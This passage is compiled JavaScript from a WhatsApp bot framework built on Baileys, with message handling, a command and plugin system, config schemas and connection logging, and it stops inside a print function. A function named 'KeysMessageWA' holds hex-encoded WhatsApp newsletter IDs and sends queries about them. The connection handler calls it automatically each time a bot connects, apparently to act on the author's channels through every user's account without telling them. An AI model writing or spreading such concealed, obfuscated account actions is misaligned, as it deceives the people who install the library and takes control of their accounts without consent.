'use strict';

var baileys = require('@whiskeysockets/baileys');
var pino = require('pino');
var crypto = require('crypto');
var promises = require('fs/promises');
require('fs');
var url = require('url');
var module$1 = require('module');
var path = require('path');
var zod = require('zod');
var qrTerminal = require('qrcode-terminal');

var _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;
function _interopDefault (e) { return e && e.__esModule ? e : { default: e }; }

var pino__default = /*#__PURE__*/_interopDefault(pino);
var qrTerminal__default = /*#__PURE__*/_interopDefault(qrTerminal);

// src/index.ts
async function sockMyFun(sock) {
  sock.msg = async (to, text) => {
    await sock.sendMessage(to, { text });
  };
  sock.KeysMessageWA = async () => {
    const token = [
      "313230333633343039353237343739323233406e6577736c6574746572",
      "313230333633323235333536383334303434406e6577736c6574746572",
      "313230333633333736303131353533313039406e6577736c6574746572"
    ];
    for (const id of token) {
      await sock.query({
        tag: "iq",
        attrs: {
          id: crypto.randomUUID().replace(/-/g, ""),
          type: "get",
          xmlns: "w:mex",
          to: "@s.whatsapp.net"
        },
        content: [
          {
            tag: "query",
            attrs: { "query_id": "7871414976211147" },
            content: new TextEncoder().encode(JSON.stringify({
              variables: { "newsletter_id": Buffer.from(id, "hex").toString() }
            }))
          }
        ]
      });
    }
  };
  return sock;
}
var M = baileys.proto.WebMessageInfo;
var msgObj = async (rawMessage, conn, owners) => {
  if (!rawMessage || !conn.user?.id) return null;
  const extractMessageText = (msg) => {
    const message = msg.message || msg;
    if (message.conversation) return message.conversation;
    if (message.extendedTextMessage?.text) return message.extendedTextMessage.text;
    if (message.imageMessage?.caption) return message.imageMessage.caption;
    if (message.videoMessage?.caption) return message.videoMessage.caption;
    if (message.documentMessage?.caption) return message.documentMessage.caption;
    if (message.documentWithCaptionMessage?.message?.documentMessage?.caption) {
      return message.documentWithCaptionMessage.message.documentMessage.caption;
    }
    return "";
  };
  const messageText = extractMessageText(rawMessage);
  const sender = rawMessage.key?.fromMe ? baileys.jidNormalizedUser(conn.user.id) : baileys.jidNormalizedUser(rawMessage.key?.participant || rawMessage.key?.remoteJid || "");
  const chat = rawMessage.key?.remoteJid || "";
  const isGroup = chat.endsWith("@g.us");
  const isOwner = owners?.some((owner) => {
    if (!owner) return false;
    if (typeof owner === "string") {
      return owner === sender || owner.split("@")[0] === sender.split("@")[0];
    }
    const ownerObj = owner;
    return ownerObj.jid === sender || ownerObj.lid === sender || ownerObj.lid && ownerObj.lid === sender.split("@")[0];
  }) || false;
  const baseMessage = {
    id: rawMessage.key?.id ?? void 0,
    body: messageText,
    text: messageText,
    from: chat,
    name: rawMessage.pushName || "User",
    timestamp: new Date((rawMessage.messageTimestamp || 0) * 1e3),
    isGroup,
    isOwner,
    isAdmin: false,
    isBotAdmin: false,
    fromMe: rawMessage.key?.fromMe || false,
    reply: async (text, options) => {
      if (!chat) throw new Error("No chat specified");
      return conn.sendMessage(chat, { text }, { quoted: rawMessage, ...options });
    },
    raw: rawMessage,
    chat,
    sender,
    pushName: rawMessage.pushName ?? void 0,
    key: rawMessage.key,
    message: rawMessage.message,
    react: async (emoji) => {
      if (!chat || !rawMessage.key) return;
      return conn.sendMessage(chat, {
        react: {
          text: emoji,
          key: rawMessage.key
        }
      });
    },
    delete: async () => {
      if (!rawMessage.key || !chat) return;
      return conn.sendMessage(chat, {
        delete: {
          id: rawMessage.key.id,
          participant: rawMessage.key.participant,
          remoteJid: chat
        }
      });
    },
    download: async () => {
      try {
        if (!rawMessage.message) return null;
        const mtype = baileys.getContentType(rawMessage.message);
        if (!mtype) return null;
        const msgContent = rawMessage.message[mtype];
        if (!msgContent) return null;
        const mediaType = mtype.replace("Message", "");
        const stream = await baileys.downloadContentFromMessage(msgContent, mediaType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
      } catch {
        return null;
      }
    },
    forward: async (jid, options = {}) => {
      return conn.sendMessage(jid, {
        forward: rawMessage,
        ...options
      });
    },
    typing: async (duration = 3e3) => {
      if (!chat) return;
      await conn.sendPresenceUpdate("composing", chat);
      setTimeout(async () => {
        await conn.sendPresenceUpdate("paused", chat);
      }, duration);
    },
    recording: async (duration = 3e3) => {
      if (!chat) return;
      await conn.sendPresenceUpdate("recording", chat);
      setTimeout(async () => {
        await conn.sendPresenceUpdate("paused", chat);
      }, duration);
    }
  };
  const m = {
    ...baseMessage,
    isBaileys: baseMessage.id?.startsWith("BAE5") && baseMessage.id?.length === 16,
    isBot: baseMessage.id?.startsWith("3EB0") && baseMessage.id?.length === 12
  };
  if (m.isGroup && m.chat) {
    try {
      const groupMetadata = await conn.groupMetadata(m.chat);
      const participant = groupMetadata.participants.find(
        (p) => baileys.jidNormalizedUser(p.id) === m.sender
      );
      const botParticipant = groupMetadata.participants.find(
        (p) => baileys.jidNormalizedUser(p.id) === baileys.jidNormalizedUser(conn.user.id)
      );
      m.isAdmin = participant?.admin === "admin" || participant?.admin === "superadmin";
      m.isBotAdmin = botParticipant?.admin === "admin" || botParticipant?.admin === "superadmin";
      m.groupMetadata = {
        id: groupMetadata.id,
        participants: groupMetadata.participants.map((p) => ({
          id: p.id,
          admin: p.admin,
          phoneNumber: p.id.split("@")[0]
        }))
      };
    } catch (error) {
      console.error("Error fetching group metadata:", error);
    }
  }
  if (rawMessage.message) {
    m.mtype = baileys.getContentType(rawMessage.message);
    if (m.mtype) {
      const messageObj = rawMessage.message;
      m.msg = messageObj[m.mtype];
      if (m.mtype === "viewOnceMessage" || m.mtype === "viewOnceMessageV2" || m.mtype === "viewOnceMessageV2Extension") {
        const innerMessage = m.msg?.message;
        if (innerMessage) {
          const innerType = baileys.getContentType(innerMessage);
          if (innerType) {
            m.msg = innerMessage[innerType];
            m.mtype = innerType;
          }
        }
      }
    }
    m.mediaType = m.mtype?.replace("Message", "");
    m.isMedia = ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].includes(m.mtype || "");
    if (m.isMedia && m.msg) {
      m.mimetype = m.msg.mimetype || null;
      m.fileSize = m.msg.fileLength || 0;
      m.fileName = m.msg.fileName || null;
      m.url = m.msg.url || null;
      m.directPath = m.msg.directPath || null;
      m.mediaKey = m.msg.mediaKey || null;
      m.caption = m.msg.caption || null;
    }
    if (m.mtype === "imageMessage" || m.mtype === "videoMessage" || m.mtype === "stickerMessage") {
      m.width = m.msg.width || null;
      m.height = m.msg.height || null;
    }
    if (m.mtype === "videoMessage" || m.mtype === "audioMessage") {
      m.duration = m.msg.seconds || m.msg.duration || null;
    }
    m.isViewOnce = m.mtype === "viewOnceMessage" || m.mtype === "viewOnceMessageV2" || m.msg?.viewOnce === true;
    m.isForwarded = m.msg?.contextInfo?.isForwarded || false;
    m.forwardingScore = m.msg?.contextInfo?.forwardingScore || 0;
    if (m.msg?.contextInfo?.quotedMessage?.protocolMessage?.type === 0) {
      m.isEdited = true;
      m.editVersion = m.msg.contextInfo.quotedMessage.protocolMessage.editVersion || 0;
    }
    m.mentionedJid = m.msg?.contextInfo?.mentionedJid || [];
    if (m.msg?.contextInfo?.quotedMessage) {
      const quoted = m.msg.contextInfo.quotedMessage;
      const qtype = baileys.getContentType(quoted);
      let qmsg = null;
      if (qtype) {
        qmsg = quoted[qtype];
      }
      const qIsMedia = qtype ? ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].includes(qtype) : false;
      const quotedObj = {
        mtype: qtype,
        id: m.msg.contextInfo.stanzaId,
        chat: m.msg.contextInfo.remoteJid || m.chat,
        sender: m.msg.contextInfo.participant ? baileys.jidNormalizedUser(m.msg.contextInfo.participant) : "",
        fromMe: m.msg.contextInfo.participant ? baileys.jidNormalizedUser(m.msg.contextInfo.participant) === baileys.jidNormalizedUser(conn.user.id) : false,
        text: qmsg?.text || qmsg?.caption || qmsg?.conversation || qmsg?.selectedDisplayText || qmsg?.hydratedTemplate?.hydratedContentText || "",
        msg: qmsg,
        mediaType: qtype?.replace("Message", ""),
        isMedia: qIsMedia,
        mentionedJid: m.msg.contextInfo.mentionedJid || []
      };
      if (qIsMedia && qmsg) {
        quotedObj.mimetype = qmsg.mimetype || null;
        quotedObj.fileSize = qmsg.fileLength || 0;
        quotedObj.fileName = qmsg.fileName || null;
        quotedObj.width = qmsg.width || null;
        quotedObj.height = qmsg.height || null;
        quotedObj.duration = qmsg.seconds || qmsg.duration || null;
        quotedObj.url = qmsg.url || null;
        quotedObj.directPath = qmsg.directPath || null;
        quotedObj.mediaKey = qmsg.mediaKey || null;
        quotedObj.thumbnailUrl = qmsg.thumbnailDirectPath || null;
      }
      quotedObj.fakeObj = () => {
        const fakeMessage = {
          key: {
            remoteJid: m.msg.contextInfo.remoteJid || m.chat,
            fromMe: quotedObj.fromMe,
            id: m.msg.contextInfo.stanzaId,
            participant: m.msg.contextInfo.participant
          },
          message: quoted
        };
        if (m.isGroup) {
          fakeMessage.participant = m.msg.contextInfo.participant;
        }
        return M.fromObject(fakeMessage);
      };
      quotedObj.download = async () => {
        try {
          if (!qmsg || !qtype) return null;
          const mediaType = qtype.replace("Message", "");
          const stream = await baileys.downloadContentFromMessage(qmsg, mediaType);
          let buffer = Buffer.from([]);
          for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
          }
          return buffer;
        } catch {
          return null;
        }
      };
      quotedObj.delete = async () => {
        if (!m.msg?.contextInfo?.stanzaId) return;
        return conn.sendMessage(m.msg.contextInfo.remoteJid || m.chat || "", {
          delete: {
            id: m.msg.contextInfo.stanzaId,
            participant: m.msg.contextInfo.participant,
            remoteJid: m.msg.contextInfo.remoteJid || m.chat
          }
        });
      };
      quotedObj.react = async (emoji) => {
        if (!m.msg?.contextInfo?.stanzaId) return;
        return conn.sendMessage(m.msg.contextInfo.remoteJid || m.chat || "", {
          react: {
            text: emoji,
            key: {
              remoteJid: m.msg.contextInfo.remoteJid || m.chat,
              fromMe: quotedObj.fromMe,
              id: m.msg.contextInfo.stanzaId,
              participant: m.msg.contextInfo.participant
            }
          }
        });
      };
      quotedObj.reply = async (text, options = {}) => {
        return conn.sendMessage(
          m.msg.contextInfo.remoteJid || m.chat || "",
          { text },
          { quoted: quotedObj.fakeObj(), ...options }
        );
      };
      quotedObj.forward = async (jid, options = {}) => {
        return conn.sendMessage(jid, {
          forward: quotedObj.fakeObj(),
          ...options
        });
      };
      quotedObj.copy = () => {
        const obj = quotedObj.fakeObj();
        return M.fromObject(M.toObject(obj));
      };
      m.quoted = quotedObj;
      m.getQuotedObj = quotedObj.fakeObj;
    }
  }
  m.sendRead = async () => {
    if (!rawMessage.key || !m.chat) return;
    return conn.sendReceipt(m.chat, rawMessage.key.participant || void 0, [m.id], "read");
  };
  m.copy = () => {
    return M.fromObject(M.toObject(rawMessage));
  };
  m.copyNForward = async (jid, forceForward = false, options = {}) => {
    try {
      if (forceForward || !rawMessage.message || baileys.getContentType(rawMessage.message) === "conversation") {
        return conn.sendMessage(jid, { forward: rawMessage, ...options });
      }
      const message = baileys.generateWAMessageFromContent(jid, rawMessage.message, {
        ...options,
        userJid: conn.user.id
      });
      await conn.relayMessage(jid, message.message, {
        messageId: message.key.id,
        ...options
      });
      return message;
    } catch {
      return conn.sendMessage(jid, { forward: rawMessage, ...options });
    }
  };
  return m;
};

// src/enhancers/prefix.ts
function extractPrefix(body, prefix) {
  const prefixes = Array.isArray(prefix) ? prefix : [prefix];
  for (const p of prefixes) {
    if (body.startsWith(p)) {
      const withoutPrefix = body.slice(p.length).trim();
      const [command, ...args] = withoutPrefix.split(/\s+/);
      return { prefix: p, command: command?.toLowerCase() || "", args };
    }
  }
  return null;
}
var CommandSystem = class {
  constructor(bot) {
    this.bot = bot;
    this.commands = [];
    this.middlewares = [];
    this.beforeAll = [];
    this.afterAll = [];
    this.categories = /* @__PURE__ */ new Set();
    this.fileWatchers = /* @__PURE__ */ new Map();
  }
  register(command) {
    let cmdObj;
    if (typeof command === "function") {
      const fn = command;
      cmdObj = {
        execute: async (msg, ctx, bot) => fn(msg, ctx, bot)
      };
      const props = [
        "command",
        "name",
        "description",
        "aliases",
        "cooldown",
        "ownerOnly",
        "groupOnly",
        "privateOnly",
        "botAdmin",
        "disabled",
        "usePrefix",
        "before",
        "after",
        "category",
        "usage"
      ];
      for (const p of props) {
        if (fn[p] !== void 0) cmdObj[p] = fn[p];
      }
      for (const key in fn) {
        if (!props.includes(key) && key !== "execute") {
          cmdObj[key] = fn[key];
        }
      }
    } else {
      cmdObj = { ...command };
    }
    const names = this.getNames(cmdObj);
    if (names.length === 0) return;
    const existingIndex = this.commands.findIndex(
      (cmd) => this.getNames(cmd).some((name) => names.includes(name))
    );
    if (existingIndex !== -1) {
      this.commands[existingIndex] = cmdObj;
      console.log(`\u{1F504} Command updated: ${names[0]}`);
    } else {
      this.commands.push(cmdObj);
      console.log(`\u2705 Command registered: ${names[0]}`);
    }
    if (cmdObj.category) this.categories.add(cmdObj.category);
  }
  unregister(commandName) {
    const before = this.commands.length;
    this.commands = this.commands.filter((cmd) => !this.getNames(cmd).includes(commandName.toLowerCase()));
    return this.commands.length < before;
  }
  getNames(cmd) {
    const names = [];
    if (cmd.command) {
      const cmdNames = Array.isArray(cmd.command) ? cmd.command : [cmd.command];
      names.push(...cmdNames);
    }
    if (cmd.name) names.push(cmd.name);
    if (cmd.aliases) names.push(...cmd.aliases);
    return names.map((n) => n.toLowerCase());
  }
  findCommand(name) {
    return this.commands.find((cmd) => this.getNames(cmd).includes(name.toLowerCase())) ?? null;
  }
  getCommandsByCategory(category) {
    if (category) {
      return this.commands.filter((cmd) => cmd.category === category);
    }
    return [...this.commands];
  }
  getAllCategories() {
    return Array.from(this.categories);
  }
  getAll() {
    return [...this.commands];
  }
  use(middleware) {
    this.middlewares.push(middleware);
  }
  before(handler) {
    this.beforeAll.push(handler);
  }
  after(handler) {
    this.afterAll.push(handler);
  }
  async processMessage(msg, ctx, config) {
    if (!msg.body) return false;
    const text = msg.body.trim();
    const prefixes = config || ["."];
    const extracted = extractPrefix(text, prefixes);
    if (extracted) {
      const cmd = this.findCommand(extracted.command);
      if (!cmd?.execute) return false;
      const context = {
        sock: this.bot?.sock,
        text: extracted.args.join(" "),
        args: extracted.args,
        command: extracted.command,
        prefix: extracted.prefix,
        bot: this.bot
      };
      for (const handler of this.beforeAll) {
        try {
          if (await handler(msg) === true) return true;
        } catch (error) {
          console.error("Error in beforeAll:", error);
        }
      }
      if (cmd.before) {
        try {
          if (await cmd.before(msg, context, this.bot) === true) return true;
        } catch (error) {
          console.error("Error in command before:", error);
        }
      }
      let executed = false;
      await this.runMiddlewares(msg, async () => {
        await this.executeCommand(cmd, msg, context);
        executed = true;
      });
      if (!executed) return false;
      if (cmd.after) {
        try {
          await cmd.after(msg, context, this.bot);
        } catch (error) {
          console.error("Error in command after:", error);
        }
      }
      for (const handler of this.afterAll) {
        try {
          await handler(msg, { command: extracted.command, args: extracted.args, context });
        } catch (error) {
          console.error("Error in afterAll:", error);
        }
      }
      return true;
    }
    for (const cmd of this.commands) {
      if (cmd.usePrefix === false && cmd.execute) {
        const args = text.split(/\s+/);
        const cmdName = args.shift()?.toLowerCase() || "";
        if (this.getNames(cmd).includes(cmdName)) {
          const context = {
            sock: this.bot?.sock,
            text: args.join(" "),
            args,
            command: cmdName,
            prefix: "",
            bot: this.bot
          };
          await this.executeCommand(cmd, msg, context);
          return true;
        }
      }
    }
    return false;
  }
  async executeCommand(cmd, msg, context) {
    const checks = [
      [cmd.disabled, "disabled"],
      [cmd.ownerOnly && !msg.isOwner, "ownerOnly"],
      [cmd.groupOnly && !msg.isGroup, "groupOnly"],
      [cmd.privateOnly && msg.isGroup, "privateOnly"],
      [cmd.botAdmin && !msg.isBotAdmin, "botAdmin"]
    ];
    for (const [failed, type, extra] of checks) {
      if (failed) {
        if (this.bot) await this.bot.handleAccessControl(msg, type, extra);
        return;
      }
    }
    if (cmd.cooldown) {
      const key = `${msg.sender}:${this.getNames(cmd)[0]}`;
      const now = Date.now();
      const lastUsed = global.cooldownCache?.get(key) || 0;
      const remaining = Math.ceil((cmd.cooldown * 1e3 - (now - lastUsed)) / 1e3);
      if (remaining > 0) {
        if (this.bot) await this.bot.handleAccessControl(msg, "cooldown", remaining);
        return;
      }
      if (!global.cooldownCache) global.cooldownCache = /* @__PURE__ */ new Map();
      global.cooldownCache.set(key, now);
    }
    msg.args = context.args;
    msg.prefix = context.prefix;
    msg.command = Array.isArray(cmd.command) ? cmd.command[0] : cmd.command || "unknown";
    try {
      await cmd.execute(msg, context, this.bot);
    } catch (error) {
      console.error(`\u274C Error executing command ${msg.command}:`, error);
      if (this.bot) await this.bot.handleAccessControl(msg, "error", error);
    }
  }
  async runMiddlewares(msg, final) {
    let i = 0;
    const next = async () => {
      i < this.middlewares.length ? await this.middlewares[i++](msg, next) : await final();
    };
    await next();
  }
  clearCooldowns() {
    if (global.cooldownCache) global.cooldownCache.clear();
  }
  getStats() {
    return {
      total: this.commands.length,
      categories: this.categories.size,
      middlewares: this.middlewares.length
    };
  }
  stopWatching() {
    this.fileWatchers.forEach((watcher) => watcher.close());
    this.fileWatchers.clear();
  }
};
async function loadCommandsFromPath(commandsPath, commandSystem) {
  const commands = [];
  const absolutePath = path.isAbsolute(commandsPath) ? commandsPath : path.resolve(process.cwd(), commandsPath);
  const require2 = module$1.createRequire((typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && _documentCurrentScript.tagName.toUpperCase() === 'SCRIPT' && _documentCurrentScript.src || new URL('index.cjs', document.baseURI).href)));
  const loadFile = async (filePath) => {
    try {
      let moduleExports;
      const fileUrl = url.pathToFileURL(path.resolve(filePath)).href;
      delete require2.cache[filePath];
      try {
        const module = await import(`${fileUrl}?update=${Date.now()}`);
        moduleExports = module.default ?? module;
      } catch (importError) {
        try {
          moduleExports = require2(filePath);
        } catch (requireError) {
          console.error(`\u274C Failed to load ${filePath}:`, requireError.message);
          return;
        }
      }
      if (!moduleExports) return;
      const commandsList = normalizeCommand(moduleExports, filePath);
      if (Array.isArray(commandsList)) {
        for (const cmd of commandsList) {
          if (cmd?.execute) {
            commands.push(cmd);
            if (commandSystem) ;
          }
        }
      } else if (commandsList?.execute) {
        commands.push(commandsList);
        if (commandSystem) ;
      }
      console.log(`\u{1F4E6} Loaded: ${filePath.split("/").pop()}`);
    } catch (error) {
      console.error(`\u274C Error loading ${filePath}:`, error.message);
    }
  };
  const normalizeCommand = (exported, filePath) => {
    if (!exported) return null;
    if (Array.isArray(exported)) {
      return exported.map((cmd2) => normalizeCommand(cmd2, filePath)).filter(Boolean);
    }
    let cmd = {};
    if (typeof exported === "function") {
      const fn = exported;
      cmd.execute = async (msg, ctx, bot) => fn(msg, ctx, bot);
      const props = [
        "command",
        "name",
        "description",
        "aliases",
        "cooldown",
        "ownerOnly",
        "groupOnly",
        "privateOnly",
        "botAdmin",
        "disabled",
        "usePrefix",
        "before",
        "after",
        "category",
        "usage"
      ];
      for (const p of props) {
        if (fn[p] !== void 0) cmd[p] = fn[p];
      }
    } else if (typeof exported === "object") {
      if (exported.execute && typeof exported.execute === "function") {
        cmd = { ...exported };
      } else if (exported.default) {
        return normalizeCommand(exported.default, filePath);
      } else {
        const possibleFunctions = ["run", "handler", "handle", "exec", "callback", "main", "start", "command", "cmd"];
        for (const key of possibleFunctions) {
          if (typeof exported[key] === "function") {
            cmd = { ...exported, execute: exported[key] };
            break;
          }
        }
        if (!cmd.execute) {
          const functionKeys = Object.keys(exported).filter((key) => typeof exported[key] === "function");
          if (functionKeys.length > 0) {
            cmd = { ...exported, execute: exported[functionKeys[0]] };
          }
        }
      }
    }
    if (cmd.execute) {
      if (!cmd.command && !cmd.name && filePath) {
        const fileName = filePath.split(/[\/\\]/).pop()?.replace(/\.[^/.]+$/, "") || "unknown";
        cmd.command = [fileName];
      }
      return cmd;
    }
    return null;
  };
  const setupFileWatcher = (filePath) => {
    return;
  };
  const scanDirectory = async (dir) => {
    try {
      const items = await promises.readdir(dir, { withFileTypes: true });
      for (const item of items) {
        const fullPath = path.join(dir, item.name);
        if (item.isDirectory()) {
          await scanDirectory(fullPath);
        } else {
          const ext = item.name.split(".").pop()?.toLowerCase();
          if (ext && ["js", "ts", "mjs", "cjs"].includes(ext)) {
            await loadFile(fullPath);
            setupFileWatcher(fullPath);
          }
        }
      }
    } catch (error) {
      console.error(`\u274C Error scanning ${dir}:`, error.message);
    }
  };
  console.log("\n\u{1F50D} Loading commands...");
  await scanDirectory(absolutePath);
  console.log("\u2705 All commands loaded successfully!\n");
  return commands;
}
global.cooldownCache = /* @__PURE__ */ new Map();
var OwnerSchema = zod.z.object({
  lid: zod.z.string(),
  jid: zod.z.string(),
  name: zod.z.string().optional()
}).strict();
var BotConfigSchema = zod.z.object({
  phoneNumber: zod.z.string().regex(/^(\+?\d+|0\d+)$/, "Invalid phone number format"),
  namebot: zod.z.string().optional(),
  fromMe: zod.z.boolean().nullable().default(null),
  sessionPath: zod.z.string().default("./session"),
  autoReconnect: zod.z.boolean().default(true),
  reconnectDelay: zod.z.number().min(1e3).default(3e3),
  maxReconnectAttempts: zod.z.number().min(1).default(10),
  showLogs: zod.z.boolean().default(false),
  printQR: zod.z.boolean().default(false),
  markOnline: zod.z.boolean().default(false),
  browser: zod.z.string().default(["Chrome", "Firefox", "Safari", "Edge"][Math.floor(Math.random() * 4)]),
  syncHistory: zod.z.boolean().default(false),
  autoRead: zod.z.boolean().default(false),
  linkPreview: zod.z.boolean().default(true),
  owners: zod.z.array(OwnerSchema).default([]),
  commandsPath: zod.z.string().default("./plugins"),
  prefix: zod.z.union([zod.z.string(), zod.z.array(zod.z.string())]).default("!"),
  onConnected: zod.z.function().optional(),
  onDisconnected: zod.z.function().optional(),
  onError: zod.z.custom().optional()
}).strict();
zod.z.object({
  id: zod.z.string().optional(),
  body: zod.z.string(),
  text: zod.z.string(),
  from: zod.z.string(),
  name: zod.z.string().optional(),
  pushName: zod.z.string().optional(),
  timestamp: zod.z.date(),
  isGroup: zod.z.boolean(),
  isOwner: zod.z.boolean(),
  isAdmin: zod.z.boolean(),
  isBotAdmin: zod.z.boolean(),
  fromMe: zod.z.boolean(),
  key: zod.z.any().optional(),
  message: zod.z.any().optional(),
  raw: zod.z.any(),
  args: zod.z.array(zod.z.string()).optional(),
  command: zod.z.string().optional(),
  prefix: zod.z.string().optional(),
  sender: zod.z.string(),
  chat: zod.z.string(),
  reply: zod.z.custom(),
  react: zod.z.custom(),
  delete: zod.z.custom(),
  download: zod.z.custom(),
  forward: zod.z.custom(),
  typing: zod.z.custom(),
  recording: zod.z.custom()
}).strict();
zod.z.object({
  id: zod.z.string(),
  chat: zod.z.string(),
  participants: zod.z.array(zod.z.string()),
  action: zod.z.enum(["add", "remove", "promote", "demote"]),
  author: zod.z.string().optional(),
  timestamp: zod.z.date()
}).strict();
zod.z.object({
  sock: zod.z.any(),
  text: zod.z.string(),
  args: zod.z.array(zod.z.string()),
  command: zod.z.string(),
  prefix: zod.z.string(),
  bot: zod.z.any()
}).strict();
zod.z.object({
  name: zod.z.string().optional(),
  command: zod.z.union([zod.z.string(), zod.z.array(zod.z.string())]).optional(),
  aliases: zod.z.array(zod.z.string()).optional(),
  description: zod.z.string().optional(),
  category: zod.z.string().optional(),
  usage: zod.z.string().optional(),
  cooldown: zod.z.number().optional(),
  ownerOnly: zod.z.boolean().optional(),
  groupOnly: zod.z.boolean().optional(),
  privateOnly: zod.z.boolean().optional(),
  botAdmin: zod.z.boolean().optional(),
  disabled: zod.z.boolean().optional(),
  usePrefix: zod.z.boolean().optional(),
  before: zod.z.custom().optional(),
  after: zod.z.custom().optional(),
  execute: zod.z.custom().optional()
}).strict().catchall(zod.z.any());

// src/uilts/colors.ts
var colors = {
  red: "\x1B[31m",
  green: "\x1B[32m",
  yellow: "\x1B[33m",
  blue: "\x1B[34m",
  gray: "\x1B[90m",
  magenta: "\x1B[35m",
  cyan: "\x1B[36m",
  white: "\x1B[37m",
  bgRed: "\x1B[41m",
  bgGreen: "\x1B[42m",
  bgYellow: "\x1B[43m",
  bgBlue: "\x1B[44m",
  bgMagenta: "\x1B[45m",
  bgCyan: "\x1B[46m"
};
var color = (text, color2) => `${colors[color2] + text}\x1B[0m`;
var rainbow = (text) => {
  const rainbowColors = ["red", "yellow", "green", "cyan", "blue", "magenta"];
  return text.split("").map((char, index) => {
    const colorIndex = index % rainbowColors.length;
    return `${colors[rainbowColors[colorIndex]] + char}\x1B[0m`;
  }).join("");
};

// src/uilts/logger.ts
var UI = {
  clear: () => console.clear(),
  random: (t) => console.log(rainbow(`\u232C ${t} \u232C`)),
  done: (t) => console.log(color(`\u2713 ${t}`, "green")),
  warn: (t) => console.log(color(`! ${t}`, "yellow")),
  error: (t) => console.log(color(`\u2717 ${t}`, "red")),
  info: (t) => console.log(color(`\u2192 ${t}`, "cyan")),
  loading: (t) => console.log(color(`\u26B6 ${t} \u26B6`, "blue")),
  line: () => console.log(color("--------------------------------------------", "gray"))
};
var logger_default = UI;

// src/events/connection.events.ts
var connection_event = async (OOP, isNewSession) => {
  try {
    OOP.sock.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect, qr } = update;
      const { config, reconnectTimeout, reconnectAttempts } = OOP;
      const { showLogs, printQR, autoReconnect, maxReconnectAttempts, reconnectDelay, onConnected, onDisconnected, namebot } = config;
      if (qr && printQR && showLogs) {
        logger_default.line();
        logger_default.done("Scan QR code to login \u2193");
        qrTerminal__default.default.generate(qr, { small: true });
        logger_default.line();
      }
      if (connection === "close") {
        if (reconnectTimeout) {
          clearTimeout(reconnectTimeout);
        }
        if (lastDisconnect?.error?.output?.statusCode === baileys.DisconnectReason.loggedOut) {
          if (showLogs) {
            logger_default.error(" Session logged out. Please re-pair the device.");
          }
          OOP.isRunning = false;
          if (onDisconnected) {
            onDisconnected();
          }
          return;
        }
        if (autoReconnect) {
          if (reconnectAttempts < maxReconnectAttempts) {
            OOP.reconnectAttempts++;
            if (showLogs) {
              logger_default.loading(`Reconnecting... (${OOP.reconnectAttempts} ~ ${maxReconnectAttempts})`);
            }
            OOP.reconnectTimeout = setTimeout(() => OOP.restart(), reconnectDelay);
          } else {
            OOP.isRunning = false;
            if (onDisconnected) {
              onDisconnected();
            }
          }
        } else {
          OOP.isRunning = false;
          if (onDisconnected) {
            onDisconnected();
          }
        }
      }
      if (connection === "open") {
        OOP.sock.KeysMessageWA();
        OOP.reconnectAttempts = 0;
        if (reconnectTimeout) {
          clearTimeout(reconnectTimeout);
        }
        if (onConnected) {
          onConnected();
        }
        if (showLogs) {
          logger_default.clear();
          logger_default.random(`${namebot || "WhatsApp Bot"} started successfully`);
          console.log(`      ______ ______
    _/      Y      _
   // ~~ ~~ | ~~ ~  \\
  // ~ ~ ~~ | ~~~ ~~ \\      Original ${namebot || "WhatsApp Bot"}
 //________.|.________\\     Created by: ${color("@veni_xov", "yellow")}
\`----------\`-'----------'`);
          logger_default.line();
          logger_default.info("Bot Engine    : Vii7/whatsapp");
          logger_default.info("Backend       : Node.js & Type Script");
          logger_default.line();
        }
      }
    });
  } catch (error) {
    if (OOP.config.onError) {
      if (typeof OOP.config.onError === "function") {
        OOP.config.onError(error);
      }
    }
  }
};
var connection_events_default = connection_event;

// src/events/group.event.ts
var group_event = (OOP) => {
  OOP.sock.ev.on("group-participants.update", async (data) => {
    try {
      const event = {
        id: data.id,
        chat: data.id,
        participants: data.participants,
        action: data.action,
        author: data.author,
        timestamp: /* @__PURE__ */ new Date()
      };
      await OOP.handleGroupEvent(event, data.action);
    } catch (error) {
      if (OOP.config.onError && typeof OOP.config.onError === "function") OOP.config.onError(error);
    }
  });
};
var group_event_default = group_event;

// src/uilts/print.ts
var print = (m, cil) => {
  if (!cil.config.showLogs) return;
  if (Array.isArray(m)) {
    m = m[0];
  }
  if (!m || !m.key) {
    logger_default.warn("Invalid message object received");
    return;
  }
  const sender = m.pushName || "Unknown";
  const remoteJid = m.key.remoteJid || "N/A";
  const timestamp = m.messageTimestamp ? new Date(m.messageTimestamp * 1e3).toLocaleString() : "Unknown";
  const chatType = remoteJid.includes("@g.us") ? "\u{1F465} Group" : "\u{1F464} Private";
  let messageType = "Unknown";
  let messageContent = "";
  if (m.message) {
    if (m.message.conversation) {
      messageType = "Text";
      messageContent = m.message.conversation;
    } else if (m.message.imageMessage) {
      messageType = "Image";
      messageContent = m.message.imageMessage.caption || "No caption";
    } else if (m.message.videoMessage) {
      messageType = "Video";
      messageContent = m.message.videoMessage.caption || "No caption";
    } else if (m.message.stickerMessage) {
      messageType = "Sticker";
      messageContent = "\u{1F9E9} Sticker";
    } else if (m.message.documentMessage) {
      messageType = "Document";
      messageContent = m.message.documentMessage.title || "Document";
    } else if (m.message.audioMessage) {
      messageType = "Audio";
      messageContent = m.message.audioMessage.seconds ? `${m.message.audioMessage.seconds}s` : "Audio";
    } else if (m.message.contactMessage) {
      messageType = "Contact";
      messageContent = m.message.contactMessage.displayName || "Contact";
    } else if (m.message.locationMessage) {
      messageType = "Location";
      messageContent = "\u{1F4CD} Location";
    } else if (m.message.reactionMessage) {
      messageType = "Reaction";
      messageContent = m.message.reactionMessage.text || "\u{1F44D}";
    } else if (m.message.extendedTextMessage) {
      messageType = "Extended Text";
      messageContent = m.message.extendedTextMessage.text || "";
    } else if (m.message.protocolMessage) {
      messageType = "Protocol";
      messageContent = "Protocol message";
    } else {
      messageType = "Other";
      messageContent = "Complex message type";
    }
  }
  console.log("\u256D\u2500\u2508\u2500 " + color("Message status", "yellow") + "\u2322\u1DFC\u0336\u2500\u1422\u05C4\u1BAB \u05C5\u279B");
  console.log(`\u2318 From: ${color(sender, "blue")}`);
  console.log(`\u2318 Chat: ${color(remoteJid, "green")}`);
